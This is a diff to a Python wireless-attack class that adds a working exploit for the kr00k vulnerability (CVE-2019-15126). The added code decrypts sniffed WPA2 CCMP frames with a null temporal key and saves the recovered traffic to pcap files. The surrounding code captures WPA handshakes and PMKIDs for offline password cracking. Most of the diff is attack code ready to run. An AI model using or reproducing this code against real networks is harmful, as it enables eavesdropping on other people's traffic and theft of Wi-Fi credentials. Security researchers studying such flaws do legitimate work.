@@ -26,6 +26,7 @@ from os.path import join as path_join
 from shutil import rmtree
 from time import sleep
 from datetime import datetime
+from Cryptodome.Cipher import AES
 # endregion
 
 
@@ -38,6 +39,8 @@ class WiFi:
     bssids: Dict[str, Dict[str, Union[int, float, str, bytes, List[Union[int, str]]]]] = dict()
     wpa_handshakes: Dict[str, Dict[str, Dict[str, Union[int, float, str, bytes]]]] = dict()
     pmkid_authentications: Dict[str, Dict[str, Union[float, int, str, bytes]]] = dict()
+    kr00k_packets: Dict[str, Dict[str, Dict[str, Union[int, float, str]]]] = dict()
+
     deauth_packets: List[Dict[str, Union[int, float, str]]] = list()
     association_packets: List[Dict[str, Union[bool, float, str]]] = list()
     channels: List[Dict[str, Union[int, float]]] = list()
@@ -132,8 +135,7 @@ class WiFi:
                 self._switch_wifi_channel(channel=wifi_channel)
 
             # Switching between WiFi channels
-            if wifi_channel is None:
-                self._thread_manager.add_task(self._scan_ssids)
+            self._thread_manager.add_task(self._scan_ssids)
 
             # Check sniffer start
             assert self._start_sniffer(), 'Failed to start sniffer!'
@@ -157,14 +159,17 @@ class WiFi:
 
         # Linux
         elif self._base.get_platform().startswith('Linux'):
+            run(['service network-manager stop'], shell=True, stdout=PIPE, stderr=STDOUT)
             self._base.kill_process_by_name(process_name='wpa_supplicant')
             interface_mode: CompletedProcess = run(['iwconfig ' + wireless_interface], shell=True, stdout=PIPE)
             interface_mode: str = interface_mode.stdout.decode('utf-8')
             if 'Mode:Monitor' not in interface_mode:
                 self._base.print_info('Set monitor mode on wireless interface: ', wireless_interface)
+                sleep(0.5)
                 run(['ifconfig ' + wireless_interface + ' down'], shell=True, stdout=PIPE)
                 run(['iwconfig ' + wireless_interface + ' mode monitor'], shell=True, stdout=PIPE)
                 run(['ifconfig ' + wireless_interface + ' up'], shell=True, stdout=PIPE)
+                sleep(0.5)
                 interface_mode: CompletedProcess = run(['iwconfig ' + wireless_interface], shell=True, stdout=PIPE)
                 interface_mode: str = interface_mode.stdout.decode('utf-8')
                 if 'Mode:Monitor' not in interface_mode:
@@ -484,6 +489,34 @@ class WiFi:
             return None
     # endregion
 
+    # region Decrypt CCMP data
+    def _decrypt(self,
+                 encrypted_data: bytes = b'',
+                 source_mac_address: str = '01:23:45:67:89:0a',
+                 temporal_key: bytes = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00',
+                 key_initialization_vector: bytes = b'\x00\x00\x00\x00\x00\x01') -> Union[None, bytes]:
+        """
+        Decrypt the data
+        :param encrypted_data: Bytes of Encrypted data
+        :param source_mac_address: Source MAC address (example: '01:23:45:67:89:0a')
+        :param temporal_key: 128 bits – Temporal Key (default: b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+        :param key_initialization_vector: Key Initialization Vector (default: b'\x00\x00\x00\x00\x00\x01')
+        :return: Bytes of Decrypted data or None if error
+        """
+        try:
+            assert self._base.mac_address_validation(source_mac_address), 'Bad source MAC address'
+            assert len(key_initialization_vector) == 6, 'Bad Key Initialization Vector length'
+            assert len(temporal_key) == 16, 'Bad Temporal Key length'
+            nonce: bytes = b'\x00' + self._convert_mac(source_mac_address) + key_initialization_vector
+            cipher: AES = AES.new(temporal_key, AES.MODE_CCM, nonce, mac_len=8)
+            decrypted_data: bytes = cipher.decrypt(encrypted_data)
+            assert decrypted_data.startswith(b'\xaa\xaa\x03'), 'Decrypt error'
+            return decrypted_data
+
+        except AssertionError:
+            return None
+    # endregion
+
     # region Analyze 802.11 packet
     def _analyze_packet(self, packet) -> None:
         try:
@@ -554,9 +587,9 @@ class WiFi:
                     # Decrement number of packets
                     self.bssids[bssid]['packets'] -= 1
 
-                    # Wait 1 seconds
-                    assert (datetime.utcnow().timestamp() - self.bssids[bssid]['timestamp']) > 1, \
-                        'Less than 1 seconds have passed'
+                    # Wait 5 seconds
+                    assert (datetime.utcnow().timestamp() - self.bssids[bssid]['timestamp']) > 5, \
+                        'Less than 5 seconds have passed'
                 # endregion
 
                 # region Parse beacon tags, set: Timestamp, ESSID, Channel and Signal
@@ -656,13 +689,13 @@ class WiFi:
                     # Vendor specific oui type 2 - WMM/WME
                     elif parsed_beacon_tags[221][3:4] == b'\x02':
                         if 45 in parsed_beacon_tags.keys() and 61 in parsed_beacon_tags.keys():
-                            self.bssids[packet[Dot11FCS].addr2]['enc list'].append('OPEN')
-                            self.bssids[packet[Dot11FCS].addr2]['auth list'].append('-')
-                            self.bssids[packet[Dot11FCS].addr2]['cipher list'].append('OPEN')
+                            self.bssids[bssid]['enc list'].append('OPEN')
+                            self.bssids[bssid]['auth list'].append('-')
+                            self.bssids[bssid]['cipher list'].append('OPEN')
                         else:
-                            self.bssids[packet[Dot11FCS].addr2]['enc list'].append('WEP')
-                            self.bssids[packet[Dot11FCS].addr2]['auth list'].append('-')
-                            self.bssids[packet[Dot11FCS].addr2]['cipher list'].append('WEP')
+                            self.bssids[bssid]['enc list'].append('WEP')
+                            self.bssids[bssid]['auth list'].append('-')
+                            self.bssids[bssid]['cipher list'].append('WEP')
 
                     # Unknown vendor specific oui type
                     else:
@@ -673,9 +706,9 @@ class WiFi:
 
                 # region No encryption
                 else:
-                    self.bssids[packet[Dot11FCS].addr2]['enc list'].append('OPEN')
-                    self.bssids[packet[Dot11FCS].addr2]['auth list'].append('-')
-                    self.bssids[packet[Dot11FCS].addr2]['cipher list'].append('OPEN')
+                    self.bssids[bssid]['enc list'].append('OPEN')
+                    self.bssids[bssid]['auth list'].append('-')
+                    self.bssids[bssid]['cipher list'].append('OPEN')
                 # endregion
 
                 # endregion
@@ -720,22 +753,98 @@ class WiFi:
                     pass
             # endregion
 
-            # region 802.11 CCMP and Direction: Client -> AP (from Client to AP)
+            # region 802.11 CCMP
             if packet.haslayer(Dot11CCMP) and \
                     packet[Dot11FCS].type == 2 and \
-                    packet[Dot11FCS].subtype == 8 and \
-                    packet[Dot11FCS].FCfield.value % 2 != 0 and \
+                    (packet[Dot11FCS].subtype == 8 or packet[Dot11FCS].subtype == 0) and \
                     packet[Dot11FCS].addr1 != packet[Dot11FCS].addr2 and \
                     packet[Dot11CCMP].payload.name == 'NoPayload':
+
+                # region Direction: Client -> AP (from Client to AP)
+                if packet[Dot11FCS].FCfield.value % 2 != 0:
+                    bssid: str = packet[Dot11FCS].addr1
+                    client: str = packet[Dot11FCS].addr2
+                    destination_dot11: str = packet[Dot11FCS].addr3
+                    source: str = client
+                    destination: str = bssid
+                    direction: str = 'to-AP'
+                # endregion
+
+                # region Direction: AP -> Client (from AP to Client)
+                else:
+                    bssid: str = packet[Dot11FCS].addr2
+                    client: str = packet[Dot11FCS].addr3
+                    destination_dot11: str = packet[Dot11FCS].addr1
+                    source: str = bssid
+                    destination: str = client
+                    direction: str = 'from-AP'
+                # endregion
+
+                # region Add Client MAC address in clients list
                 try:
-                    if packet[Dot11FCS].addr1 in self.bssids.keys():
-                        if packet[Dot11FCS].addr2 not in self.bssids[packet[Dot11FCS].addr1]['clients']:
-                            self.bssids[packet[Dot11FCS].addr1]['clients'].append(packet[Dot11FCS].addr2)
+                    if direction == 'to-AP' and bssid in self.bssids.keys():
+                        if client not in self.bssids[bssid]['clients']:
+                            self.bssids[bssid]['clients'].append(client)
                 except KeyError:
                     pass
+                # endregion
+
+                # region Decrypt CCMP packet with NULL 128 bits – Temporal Key (CVE-2019-15126 kr00k vulnerability)
+                try:
+                    assert len(packet[Dot11CCMP].data) >= 24, 'Bad encrypted data length'
+                    key_iv: bytes = \
+                        bytes([packet[Dot11CCMP].PN5]) + bytes([packet[Dot11CCMP].PN4]) + \
+                        bytes([packet[Dot11CCMP].PN3]) + bytes([packet[Dot11CCMP].PN2]) + \
+                        bytes([packet[Dot11CCMP].PN1]) + bytes([packet[Dot11CCMP].PN0])
+                    if packet[Dot11FCS].FCfield.value % 2 != 0:
+                        decrypted_data = self._decrypt(encrypted_data=packet[Dot11CCMP].data[:-8],
+                                                       key_initialization_vector=key_iv,
+                                                       source_mac_address=client)
+                        ethernet_header: bytes = self._convert_mac(destination_dot11) + self._convert_mac(client)
+                    else:
+                        decrypted_data = self._decrypt(encrypted_data=packet[Dot11CCMP].data[:-8],
+                                                       key_initialization_vector=key_iv,
+                                                       source_mac_address=bssid)
+                        ethernet_header: bytes = self._convert_mac(client) + self._convert_mac(destination_dot11)
+
+                    assert decrypted_data is not None, 'Can not decrypt CCMP packet with NULL Temporal Key'
+                    ethernet_header += decrypted_data[6:8]
+                    decrypted_packet: bytes = ethernet_header + decrypted_data[8:]
+                    wrpcap('kr00k_' + bssid.replace(':', '') +
+                           '_' + client.replace(':', '') + '.pcap',
+                           decrypted_packet, append=True)
+
+                    # region Add kr00k packet info into dictionary
+                    if source in self.kr00k_packets.keys():
+                        if destination in self.kr00k_packets[source].keys():
+                            self.kr00k_packets[source][destination]['count'] += 1
+                            self.kr00k_packets[source][destination]['timestamp'] = datetime.utcnow().timestamp()
+                        else:
+                            self.kr00k_packets[source][destination]: Dict[str, Union[int, float, str]] = {
+                                'direction': direction,
+                                'timestamp': datetime.utcnow().timestamp(),
+                                'count': 1
+                            }
+                    else:
+                        self.kr00k_packets[source]: Dict[str, Dict[str, Union[int, float, str]]] = {
+                            destination: {
+                                'direction': direction,
+                                'timestamp': datetime.utcnow().timestamp(),
+                                'count': 1
+                            }
+                        }
+                    # endregion
+
+                except AssertionError:
+                    pass
+
+                except IndexError:
+                    pass
+                # endregion
+
             # endregion
 
-            # region EAPOL RSN PMKID
+            # region 802.11 EAPOL RSN PMKID
             if packet.haslayer(EAPOL) and \
                     packet[Dot11FCS].type == 2 and \
                     (packet[Dot11FCS].subtype == 8 or
@@ -774,7 +883,7 @@ class WiFi:
                         pmkid_file.write(self.pmkid_authentications[bssid]['content'])
             # endregion
 
-            # region EAPOL Message 1 of 4
+            # region 802.11 EAPOL Message 1 of 4
             if packet.haslayer(EAPOL) and \
                     packet[Dot11FCS].type == 2 and \
                     packet[Dot11FCS].subtype == 8 and \
@@ -808,7 +917,7 @@ class WiFi:
                 wrpcap(self.wpa_handshakes[bssid][client]['pcap file'], packet, append=True)
             # endregion
 
-            # region EAPOL Message 2 of 4
+            # region 802.11 EAPOL Message 2 of 4
             if packet.haslayer(EAPOL) and \
                     packet[Dot11FCS].type == 2 and \
                     packet[Dot11FCS].subtype == 8 and \
@@ -902,27 +1011,6 @@ class WiFi:
                     '_' + bssid.replace(':', '') + \
                     '_' + client.replace(':', '') + \
                     '_' + strftime('%Y%m%d_%H%M%S') + '.22000'
-                # endregion
-
-                # region Print Key info
-                # print_anonce: str = ' '.join('{:02X}'.format(x) for x in self.wpa_handshakes[bssid]['anonce'])
-                # print_snonce: str = ' '.join('{:02X}'.format(x) for x in self.wpa_handshakes[bssid]['snonce'])
-                # print_key_mic: str = ' '.join('{:02X}'.format(x) for x in self.wpa_handshakes[bssid]['key mic'])
-                # print_eapol: str = ' '.join('{:02X}'.format(x) for x in self.wpa_handshakes[bssid]['eapol'])
-                #
-                # self._base.print_success('ESSID (length: ' + str(len(self.wpa_handshakes[bssid][client]['essid'])) + '): ',
-                #                          self.wpa_handshakes[bssid][client]['essid'])
-                # self._base.print_success('Key version: ', str(self.wpa_handshakes[bssid]['key version']))
-                # self._base.print_success('BSSID: ', str(bssid))
-                # self._base.print_success('STA: ', str(self.wpa_handshakes[bssid]['sta']))
-                # self._base.print_success('Anonce: \n', fill(print_anonce, width=52, initial_indent=self._prefix,
-                #                                             subsequent_indent=self._prefix))
-                # self._base.print_success('Snonce: \n', fill(print_snonce, width=52, initial_indent=self._prefix,
-                #                                             subsequent_indent=self._prefix))
-                # self._base.print_success('Key MIC: \n', fill(print_key_mic, width=52, initial_indent=self._prefix,
-                #                                              subsequent_indent=self._prefix))
-                # self._base.print_success('EAPOL: \n', fill(print_eapol, width=52, initial_indent=self._prefix,
-                #                                            subsequent_indent=self._prefix))
                 # endregion
 
                 # region Save EAPOL session to hccapx, 22000, pcap files
@@ -1055,7 +1143,7 @@ class WiFi:
             for channel in self.available_wifi_channels:
                 if self._set_wifi_channel == -1:
                     self._switch_wifi_channel(channel=int(channel))
-                    sleep(3)
+                    sleep(5)
                 else:
                     sleep(1)
     # endregion
